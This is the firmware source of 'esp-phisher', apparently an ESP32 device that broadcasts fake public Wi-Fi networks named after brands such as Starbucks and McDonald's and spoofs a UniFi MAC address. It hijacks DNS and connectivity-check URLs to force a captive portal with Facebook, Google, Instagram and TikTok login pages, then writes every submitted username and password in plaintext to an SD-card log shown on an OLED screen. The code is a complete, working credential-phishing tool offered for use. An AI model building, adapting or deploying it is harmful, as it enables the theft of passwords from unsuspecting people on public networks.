// esp-phisher v1.8.2 by github.com/socalit

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>
#include <esp_wifi.h>
#include <AsyncTCP.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
#define EEPROM_SIZE 64
#define SSID_OFFSET 4
#define MAX_SSID_LEN 32

#define SD_CS 5

#define BTN_UP    32
#define BTN_DOWN  33
#define BTN_ENTER 25
#define BTN_BACK  26

#define LED_TX    12
#define LED_RX    13
#define LED_PWR   14

const char* portalHTML = "<!DOCTYPE html><html><head><title>Redirect</title><meta http-equiv=\"refresh\" content=\"0; url=/\" /></head><body>Redirecting...</body></html>";

String ap_ssid = "Free Public WiFi";
const char* ssidOptions[] = {
  "Free Public WiFi", "Airport Free WiFi", "Starbucks WiFi", "Xfinity WiFi",
  "Hotel Guest WiFi", "Free Open WiFi", "McDonald's WiFi"
};
int ssidIndex = 0;
const byte DNS_PORT = 53;
DNSServer dnsServer;
AsyncWebServer server(80);

enum MenuState { HOME, MENU, VIEW_LOG, CONFIRM_CLEAR, REBOOTING, SET_SSID };
MenuState currentState = HOME;
int selectedMenu = 0;
unsigned long lastInteraction = 0;
const unsigned long TIMEOUT_MS = 15000;
unsigned int lastLogSize = 0;

void saveSSID(const String& ssid) {
  EEPROM.begin(EEPROM_SIZE);
  int len = min((int)ssid.length(), MAX_SSID_LEN - 1);
  for (int i = 0; i < len; i++) EEPROM.write(SSID_OFFSET + i, ssid[i]);
  EEPROM.write(SSID_OFFSET + len, '\0');
  EEPROM.commit();
  EEPROM.end();
}

String loadSSID() {
  EEPROM.begin(EEPROM_SIZE);
  char ssidBuffer[MAX_SSID_LEN];
  for (int i = 0; i < MAX_SSID_LEN; i++) {
    ssidBuffer[i] = EEPROM.read(SSID_OFFSET + i);
    if (ssidBuffer[i] == '\0') break;
  }
  ssidBuffer[MAX_SSID_LEN - 1] = '\0';
  EEPROM.end();

  String result = String(ssidBuffer);
  if (result.length() > 0) {
    return result;
  } else {
    saveSSID("Free Public WiFi");
    return "Free Public WiFi";
  }
}

void resetTimer() {
  lastInteraction = millis();
}

void loadLastLogSize() {
  EEPROM.begin(EEPROM_SIZE);
  lastLogSize = EEPROM.readUInt(0);
  EEPROM.end();
}

void saveLogSize(unsigned int size) {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.writeUInt(0, size);
  EEPROM.commit();
  EEPROM.end();
}

unsigned int getLogSize() {
  if (!SD.exists("/log.txt")) return 0;
  File logFile = SD.open("/log.txt", FILE_READ);
  unsigned int size = logFile.size();
  logFile.close();
  return size;
}

void drawHomeScreen() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.print("SSID: ");
  display.println(ap_ssid.substring(0, 16));
  display.setCursor(0, 10);
  int clientCount = WiFi.softAPgetStationNum();
  display.printf("Clients: %d", clientCount);
  digitalWrite(LED_RX, clientCount > 0 ? HIGH : millis() % 1000 < 500 ? HIGH : LOW);
  display.setCursor(0, 20);
  unsigned int currentSize = getLogSize();
  display.printf("New Login: %s", currentSize > lastLogSize ? "YES" : "NO");
  digitalWrite(LED_TX, currentSize > lastLogSize ? HIGH : LOW);
  display.display();
}

void drawMenu() {
  const char* menuItems[] = {"View Logins", "Clear Logs", "Set SSID", "Reboot"};
  display.clearDisplay();
  for (int i = 0; i < 4; i++) {
    display.setCursor(0, i * 10);
    if (i == selectedMenu) display.print("> ");
    display.print(menuItems[i]);
  }
  display.display();
}

void drawSSIDSelector() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Select SSID:");
  display.setCursor(0, 10);
  display.print("> ");
  display.println(ssidOptions[ssidIndex]);
  display.display();
}

void drawLogView() {
  display.clearDisplay();
  display.setCursor(0, 0);
  if (!SD.exists("/log.txt")) {
    display.println("No logins.");
  } else {
    File f = SD.open("/log.txt", FILE_READ);
    for (int i = 0; i < 3 && f.available(); i++) {
      String line = f.readStringUntil('\n');
      display.setCursor(0, i * 10);
      display.print(line.substring(0, 20));
    }
    f.close();
    unsigned int currentSize = getLogSize();
    saveLogSize(currentSize);
    lastLogSize = currentSize;
  }
  display.display();
}

void clearLog() {
  if (SD.exists("/log.txt")) SD.remove("/log.txt");
  saveLogSize(0);
  lastLogSize = 0;
}

void blinkLed(int pin) {
  while (true) {
    digitalWrite(pin, HIGH);
    delay(250);
    digitalWrite(pin, LOW);
    delay(250);
  }
}

bool checkRequiredFiles() {
  const char* files[] = {
    "/index.html", "/admin.html", "/success.html", "/terms.html",
    "/img/facebook.png", "/img/google.png", "/img/instagram.png",
    "/img/poweredByUniFi.svg", "/img/tiktok.png"
  };
  for (int i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
    if (!SD.exists(files[i])) {
      Serial.print("Missing: ");
      Serial.println(files[i]);
      display.clearDisplay();
      display.setCursor(0, 0);
      display.println("Missing file:");
      display.println(files[i]);
      display.display();
      blinkLed(LED_PWR);
    }
  }
  return true;
}

void handleButtons() {
  int totalOptions = sizeof(ssidOptions) / sizeof(ssidOptions[0]);
  if (digitalRead(BTN_UP) == LOW) {
    resetTimer();
    if (currentState == MENU) selectedMenu = (selectedMenu + 3) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex - 1 + totalOptions) % totalOptions;
    delay(200);
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    resetTimer();
    if (currentState == MENU) selectedMenu = (selectedMenu + 1) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex + 1) % totalOptions;
    delay(200);
  }
  if (digitalRead(BTN_ENTER) == LOW) {
    resetTimer();
    if (currentState == HOME) currentState = MENU;
    else if (currentState == MENU) {
      if (selectedMenu == 0) currentState = VIEW_LOG;
      else if (selectedMenu == 1) { clearLog(); currentState = HOME; }
      else if (selectedMenu == 2) currentState = SET_SSID;
      else if (selectedMenu == 3) ESP.restart();
    } else if (currentState == VIEW_LOG) currentState = MENU;
    else if (currentState == SET_SSID) {
      ap_ssid = ssidOptions[ssidIndex];
      saveSSID(ap_ssid);
      WiFi.softAP(ap_ssid);
      currentState = HOME;
    }
    delay(200);
  }
  if (digitalRead(BTN_BACK) == LOW) {
    resetTimer();
    currentState = HOME;
    delay(200);
  }
}

void setRandomUniFiMac() {
  uint8_t mac[6] = { 0x28, 0x70, 0x4E, 0, 0, 0 };  // UniFi OUI
  mac[3] = random(0, 256);
  mac[4] = random(0, 256);
  mac[5] = random(0, 256);

  esp_wifi_set_mac(WIFI_IF_STA, mac); // Change STA interface MAC
  esp_wifi_set_mac(WIFI_IF_AP, mac);  // Change AP interface MAC

  Serial.printf("MAC spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void setup() {
  Serial.begin(115200);
  EEPROM.begin(EEPROM_SIZE);
  loadLastLogSize();
  randomSeed(esp_random());
  setRandomUniFiMac();
  ap_ssid = loadSSID();

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_ENTER, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  pinMode(LED_TX, OUTPUT);
  pinMode(LED_RX, OUTPUT);
  pinMode(LED_PWR, OUTPUT);
  digitalWrite(LED_PWR, LOW);

  Wire.begin(21, 22);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("OLED fail");
    blinkLed(LED_PWR);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("esp-phisher v1.8.2");
  display.println("github.com/socalit");
  display.display();
  delay(3000);

  if (!SD.begin(SD_CS)) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("SD Failed!");
    display.display();
    blinkLed(LED_PWR);
  }

  if (!checkRequiredFiles()) blinkLed(LED_PWR);
  digitalWrite(LED_PWR, HIGH);

  SD.open("/index.html").close();
  SD.open("/img/bg.jpg").close();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(78);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.serveStatic("/", SD, "/").setDefaultFile("index.html");
  server.serveStatic("/admin.html", SD, "/admin.html").setCacheControl("no-cache");
  server.serveStatic("/log.txt", SD, "/log.txt").setCacheControl("no-store, no-cache, must-revalidate, max-age=0");

  server.on("/img/bg.jpg", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(SD, "/img/bg.jpg", "image/jpeg", false);
  });
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html", portalHTML);
  });

  server.on("/mark-read", HTTP_POST, [](AsyncWebServerRequest *request) {
    unsigned int currentSize = getLogSize();
    saveLogSize(currentSize);
    lastLogSize = currentSize;
    request->send(200, "text/plain", "Marked as read");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("platform", true) ||
        !request->hasParam("username", true) ||
        !request->hasParam("password", true)) {
      request->send(400, "text/plain", "Missing parameters");
      return;
    }
    String platform = request->getParam("platform", true)->value();
    String user = request->getParam("username", true)->value();
    String pass = request->getParam("password", true)->value();
    if (platform == "Google" && user.indexOf('@') == -1) {
      request->redirect("/index.html?error=email");
      return;
    }
    String entry = "[" + platform + "] User: " + user + " | Pass: " + pass + "\n";
    File logFile = SD.open("/log.txt", FILE_APPEND);
    if (logFile) {
      logFile.print(entry);
      logFile.close();
      digitalWrite(LED_TX, HIGH);
      delay(300);
      digitalWrite(LED_TX, LOW);
    }
    request->redirect("/index.html?error=1");
  });

  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("key", true) && request->getParam("key", true)->value() == "3000") {
      clearLog();
      request->send(200, "text/plain", "Log cleared");
    } else {
      request->send(403, "text/plain", "Unauthorized");
    }
  });

  server.on("/bg", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("bg", true) || !request->hasParam("key", true)) {
      request->send(400, "text/plain", "Missing parameters");
      return;
    }
    String key = request->getParam("key", true)->value();
    if (key != "3000") {
      request->send(403, "text/plain", "Unauthorized");
      return;
    }
    String bgPath = request->getParam("bg", true)->value();
    bgPath.trim();
    if (bgPath.length() == 0 || !SD.exists(bgPath)) {
      request->send(404, "text/plain", "Background not found");
      return;
    }
    if (SD.exists("/img/bg.jpg")) {
      SD.remove("/img/bg.jpg");
    }
    File src = SD.open(bgPath, FILE_READ);
    if (!src) {
      request->send(500, "text/plain", "Failed to open source");
      return;
    }
    File dest = SD.open("/img/bg.jpg", FILE_WRITE);
    if (!dest) {
      src.close();
      request->send(500, "text/plain", "Failed to open dest");
      return;
    }
    uint8_t buffer[512];
    size_t bytes;
    while ((bytes = src.read(buffer, 512)) > 0) {
      dest.write(buffer, bytes);
    }
    dest.close();
    src.close();
    request->send(200, "text/plain", "Background updated");
  });

  // GET to retrieve current SSID
  server.on("/ssid", HTTP_GET, [](AsyncWebServerRequest *request) {
    String savedSSID = loadSSID();
    request->send(200, "text/plain", savedSSID.length() > 0 ? savedSSID : "No SSID set");
  });

  // POST to update SSID
  server.on("/ssid", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("ssid", true) || !request->hasParam("key", true)) {
      request->send(400, "text/plain", "Missing parameters");
      return;
    }
    String key = request->getParam("key", true)->value();
    if (key != "3000") {
      request->send(403, "text/plain", "Unauthorized");
      return;
    }
    String newSSID = request->getParam("ssid", true)->value();
    newSSID.trim();
    if (newSSID.length() > 0 && newSSID.length() <= 31) {
      ap_ssid = newSSID;
      saveSSID(ap_ssid);
      WiFi.softAP(ap_ssid);
      request->send(200, "text/plain", "SSID Updated");
    } else {
      request->send(400, "text/plain", "Invalid SSID");
    }
  });

  server.begin();
}

void loop() {
  handleButtons();
  switch (currentState) {
    case HOME: drawHomeScreen(); break;
    case MENU: drawMenu(); break;
    case VIEW_LOG: drawLogView(); break;
    case SET_SSID: drawSSIDSelector(); break;
    default: break;
  }
  if (millis() - lastInteraction > TIMEOUT_MS && currentState != HOME) {
    currentState = HOME;
  }
  delay(100);
}
